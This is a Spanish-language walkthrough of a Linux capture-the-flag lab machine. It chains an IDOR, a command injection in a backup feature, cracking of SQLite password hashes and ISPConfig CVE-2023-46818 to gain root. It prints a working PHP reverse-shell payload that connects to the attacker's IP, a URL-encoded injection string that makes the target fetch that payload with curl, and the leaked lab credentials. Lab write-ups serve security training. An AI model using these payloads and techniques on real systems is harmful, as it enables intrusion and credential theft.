## 1. Información General

- **Sistema operativo:** Linux
- **Dificultad:** Medium
- **Categoría:** Web, Privilege Escalation, Linux Enumeration
- **Descripción:**  
    Máquina orientada a la explotación de vulnerabilidades web y escalada de privilegios en Linux. El compromiso inicial se obtiene mediante una vulnerabilidad de tipo Insecure Direct Object Reference (IDOR) en una aplicación desarrollada en PHP, permitiendo acceder a archivos de otros usuarios. Posteriormente, se identifican fallas de **Command Injection**, extracción y cracking de hashes desde SQLite, y finalmente una escalada de privilegios mediante la explotación de ISPConfig usando CVE-2023-46818.
## 2. Objetivo

El objetivo de esta máquina es realizar el compromiso total del sistema mediante la identificación y explotación de múltiples vulnerabilidades encadenadas. Se busca obtener acceso inicial a través de una aplicación web vulnerable, aprovechar fallas de seguridad para ejecutar comandos arbitrarios, escalar privilegios entre usuarios del sistema y finalmente conseguir acceso como **root**.
Durante este proceso se aplicarán técnicas de enumeración, análisis de código fuente, explotación de vulnerabilidades web, cracking de credenciales y escalada de privilegios en entorno Linux.

## 3. Reconocimiento
## Escaneo inicial
### A) Comprobación de conectividad entre máquinas

**Comando ejecutado:**

```
ping 10.129.232.23 -c 1
```

Resultado:

![[Pasted image 20260627194448.png]]

### B)Verificación breve de puertos abiertos

**Comando ejecutado:**

```
nmap 10.129.232.23 
```

Resultado:

![[Pasted image 20260627194714.png]]

Agregue el dominio de la máquina al archivo **hosts** del sistema para resolver el nombre localmente.

```
sudo nano /etc/hosts
```

Se añadió la siguiente entrada:

```
10.129.232.23 nocturnal.htb
```

vista:

![[Pasted image 20260627200047.png]]

Tras acceder a la aplicación web en **nocturnal.htb**, se procedió a registrar una cuenta de usuario para analizar el comportamiento interno del sistema.

Luego de autenticarse, se subió un archivo PDF de prueba con el nombre **archivo.pdf**. Al visualizar el archivo desde la plataforma, se observó que la URL generada por la aplicación era:

```
http://nocturnal.htb/view.php?username=kino123&file=archivo.pdf
```

## Enumeración de usuarios mediante IDOR

Con el objetivo de descubrir otros usuarios registrados en la aplicación, se utilizó ffuf para fuzzear el parámetro `username` usando un diccionario de nombres comunes:

```
ffuf -u "http://nocturnal.htb/view.php?username=FUZZ&file=archivo.pdf" \
     -w /usr/share/wordlists/seclists/Usernames/Names/names.txt \
     -H "Cookie: PHPSESSID=de7sb6djcikia9dc37gpjmo0pm" \
     -mc 200 \
     -ac
```

Después del proceso de fuzzing, se identificó la existencia de otro usuario registrado en la aplicación:

```
admin
amanda
tobias
```

Resultado:

![[Pasted image 20260627201733.png]]
## Explotación de IDOR

Después del proceso de fuzzing, se identificó otro usuario registrado en la aplicación: **amanda**.

Dado que el parámetro `username` era modificable desde la URL y no existía una validación adecuada de permisos en el servidor, se intentó acceder a archivos pertenecientes a dicho usuario.

Para ello, se modificó manualmente la URL sustituyendo el usuario original por **amanda**:

```
http://nocturnal.htb/view.php?username=amanda&file=*.odt
```

Al explorar los archivos asociados a este usuario, se encontró un documento con extensión **ODT**:
`privacy.odt`

Resultado:

![[Pasted image 20260627202333.png]]

## Obtención de Credenciales

Una vez obtenido el archivo **privacy.odt** perteneciente al usuario **amanda**, fue necesario inspeccionar su contenido.

Debido a que el archivo tenía formato OpenDocument Text (**.odt**), se utilizó un visualizador online compatible con este formato para abrirlo y analizar la información almacenada.

Dentro del documento se encontró una gran cantidad de texto, entre el cual se identificó información sensible expuesta accidentalmente: una contraseña en texto plano perteneciente al usuario **amanda**.

La credencial obtenidas fue:

```
Username: amanda
Password: arHkG7HAI68X8s1J
```

Resultado:

![[Pasted image 20260627202924.png]]

## Acceso al Panel Administrativo

La autenticación fue exitosa, permitiendo iniciar sesión como el usuario **amanda**.
Una vez dentro, se obtuvo acceso al **panel de administración** de la aplicación, lo que confirmó que las credenciales filtradas pertenecían a una cuenta con privilegios elevados.

![[Pasted image 20260627205211.png]]

## 4. Intrusión Inicial y Ejecución de Comandos
### Obtención de Ejecución Remota de Comandos (RCE)

Una vez dentro del panel administrativo como el usuario `amanda`, se identificó una función de respaldo (`backup`) vulnerable a **Inyección de Comandos (Command Injection)** a través del parámetro `password`.
Se creó un archivo local denominado `payload.php` con el siguiente contenido:
```
<?php $ip = '10.10.14.41'; $port = 4444; $sock = fsockopen($ip, $port); $proc = proc_open('/bin/sh', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes); ?>
```
### Transferencia y Ejecución del Payload

Para transferir el archivo a la máquina víctima, primero se levantó un servidor web temporal en la máquina atacante utilizando Python en el puerto `8000`, dentro del mismo directorio donde se ubicaba `payload.php`.

Para transferir el archivo a la máquina víctima, se levantó un servidor HTTP local en el puerto `8000` desde la máquina atacante. Posteriormente, se aprovechó la inyección de comandos en el parámetro `password` (utilizando codificación URL para evadir restricciones de caracteres) para forzar al servidor a descargar el payload mediante `curl` y almacenarlo en el directorio temporal `/tmp`:

```
python3 -m http.server 8000
```

resultado:

![[Pasted image 20260627235904.png]]

Posteriormente, se aprovechó la inyección de comandos en el parámetro `password` (utilizando codificación URL para evadir restricciones de caracteres y espacios mediante el uso de tabuladores `%09`) para forzar al servidor a descargar el archivo mediante `curl` y almacenarlo en el directorio temporal `/tmp`:
```
password=test%0Acurl%0910.10.14.41:8000/payload.php%09-o%09/tmp/payload.php%0A
```

![[Pasted image 20260627235947.png]]

Tras confirmar la descarga exitosa, se preparó un listener de Netcat en la máquina atacante:

```
nc -lvnp 4444
```

Al recibir la conexión, se ejecutó el comando `whoami` verificando el acceso inicial bajo el contexto del usuario de servicios web:
![[Pasted image 20260627235835.png]]

```
password=test%0Aphp%09/tmp/payload.php%0A&backup=
```

## 5. Pivoteo y Escalada de Privilegios Local
### Enumeración de Base de Datos y Extracción de Hashes

Con el acceso inicial establecido, se procedió a inspeccionar el sistema de archivos en busca de datos sensibles o configuraciones del sitio. Se localizó una base de datos SQLite en un directorio superior, a la cual se accedió mediante la herramienta interactiva del sistema:

```
sqlite3 ../nocturnal_database/nocturnal_database.db
```

resultado:
![[Pasted image 20260628001350.png]]

Tras listar las tablas existentes (`.tables`), se identificó la tabla `users`. Se ejecutó una consulta para extraer los registros de los usuarios del sistema:

```
select * from users;
```
resultado:

![[Pasted image 20260628001423.png]]
### Cracking de Credenciales y Acceso SSH

Se tomó el hash MD5 correspondiente al usuario del sistema **`tobias`**: `55c82b1ccd55ab219b3b109b07d5061d`.

Mediante el uso de plataformas de cracking por diccionario en línea, se logró determinar que el valor en texto plano del hash correspondía a la cadena: **`slowmotionapocalypse`**.

resultado:
![[Pasted image 20260628001748.png]]
Con las credenciales obtenidas, se realizó una conexión directa y legítima a través del servicio SSH hacia la máquina objetivo:

```
ssh tobias@nocturnal.htb
```
Tras una enumeración exitosa en el directorio _home_ del usuario, se localizó y envió la primera bandera del sistema (`user.txt`).

resultado:
![[Pasted image 20260628002336.png]]
## 6. Escalada de Privilegios a Root

### Descubrimiento de Servicios Internos (Port Forwarding)

Con el fin de auditar servicios internos expuestos únicamente en la interfaz de bucle de retorno (_localhost_), se ejecutó el comando de estadísticas de sockets de red:

```
ss -tln
```

resultado:

![[Pasted image 20260628004038.png]]



![[Pasted image 20260628004055.png]]
La salida del comando reveló un servicio web escuchando de forma exclusiva en el puerto local **`8080`**. Al intentar interactuar con él mediante `curl -i http://127.0.0.1:8080`, se detectó una redirección HTTP hacia una ruta `/login/` gestionada por PHP.
Al estar este puerto cerrado a conexiones externas, se configuró un túnel de redirección de puertos local (**Local Port Forwarding**) a través de SSH para mapear dicho servicio interno en el puerto local `9090` de la máquina atacante:

```
ssh -L 9090:127.0.0.1:8080 tobias@10.129.232.23
```

resultado:

![[Pasted image 20260628004134.png]]
## Explotación del Panel ISPConfig y Acceso como Root

Al acceder desde el navegador de la máquina atacante a `http://127.0.0.1:9090`, se constató la presencia del panel de administración de hosting **ISPConfig**.

Haciendo uso de la técnica de reutilización de contraseñas indicada en las fases de reconocimiento, se intentó el acceso con el usuario administrador por defecto (`admin`) y la credencial previamente comprometida de Tobias (`slowmotionapocalypse`). La autenticación fue exitosa.
![[Pasted image 20260628005230.png]]

Una vez dentro del panel, se inspeccionó el entorno web y el pie de página de la aplicación, determinando de forma precisa que la versión en ejecución era **`3.2.10p1`**.
![[Pasted image 20260628005805.png]]


Esta versión específica se identificó como vulnerable al **CVE-2023-46818**, una falla de inyección de comandos que permite a usuarios autenticados ejecutar código en el sistema con los privilegios del proceso que corre las tareas automatizadas en el backend (el cual es ejecutado periódicamente por `cron` bajo los privilegios del usuario administrador máximo).
Tras explotar con éxito esta vulnerabilidad del panel, se obtuvo una consola interactiva con privilegios elevados de superusuario (`bash-5.0#`). Finalmente, se accedió al directorio del administrador y se extrajo la bandera final del ejercicio:



![[Pasted image 20260628005805.png]]

